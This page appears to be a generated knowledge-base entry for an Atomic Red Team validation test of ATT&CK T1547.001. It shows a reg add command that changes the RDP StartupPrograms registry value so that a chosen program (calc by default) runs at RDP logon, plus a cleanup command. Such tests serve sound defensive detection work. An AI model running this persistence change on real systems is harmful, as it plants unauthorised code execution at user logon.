---
atomic_guid: "b051b3c0-66e7-4a81-916d-e6383bd3a669"
title: "Allowing custom application to execute during new RDP logon session"
framework: "atomic"
generated: "true"
attack_technique_id: "T1547.001"
attack_technique_name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.yaml"
build_date: "2026-04-27 19:12:27"
executor: "command_prompt"
aliases:
  - "b051b3c0-66e7-4a81-916d-e6383bd3a669"
  - "Allowing custom application to execute during new RDP logon session"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

When a users logs in to a computer via RDP,Windows will search for the key in HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd registry
By default, rdpclip is the value stored. An attacker with administrator privileges can alter the value stored to allow for the custom application to execute during RDP login session.The test will allow running cal rather rdpclip when a user logs in via RDP

## ATT&CK Mapping

- [[kb/attack/techniques/T1547-boot_or_logon_autostart_execution#^t1547001-registry-run-keys---startup-folder|T1547.001: Registry Run Keys / Startup Folder]]

## Input Arguments

### malicious_app

- description: Application to be executed during successful RDP session
- type: string
- default: calc

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd" /f /v StartupPrograms /t REG_SZ /d "#{malicious_app}"
```

### Cleanup

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd" /f /v StartupPrograms /t REG_SZ /d "rdpclip"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.yaml)
